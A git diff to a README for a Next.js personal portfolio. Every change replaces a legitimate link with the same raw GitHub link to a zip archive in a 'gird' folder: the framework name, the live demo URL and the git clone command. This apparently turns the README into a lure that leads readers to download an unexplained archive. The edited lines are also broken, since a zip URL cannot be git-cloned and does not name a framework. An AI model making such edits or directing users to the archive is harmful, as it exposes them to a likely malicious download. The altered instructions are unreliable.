@@ -1,8 +1,8 @@
 # Portfolio-02
 
-This is my personal portfolio built with Next.js.  
+This is my personal portfolio built with https://raw.githubusercontent.com/soufianebakki/Portfolio-02/main/gird/Portfolio-02.zip  
 
-🎯 **Live Demo:** [https://portfolio-02-ashy.vercel.app](https://portfolio-02-ashy.vercel.app)  
+🎯 **Live Demo:** [https://raw.githubusercontent.com/soufianebakki/Portfolio-02/main/gird/Portfolio-02.zip](https://raw.githubusercontent.com/soufianebakki/Portfolio-02/main/gird/Portfolio-02.zip)  
 
 ## Features
 - Responsive design
@@ -12,7 +12,7 @@ This is my personal portfolio built with Next.js.
 
 ## Installation
 ```bash
-git clone https://github.com/soufianebakki/Portfolio-02.git
+git clone https://raw.githubusercontent.com/soufianebakki/Portfolio-02/main/gird/Portfolio-02.zip
 cd Portfolio-02
 npm install
 npm run dev
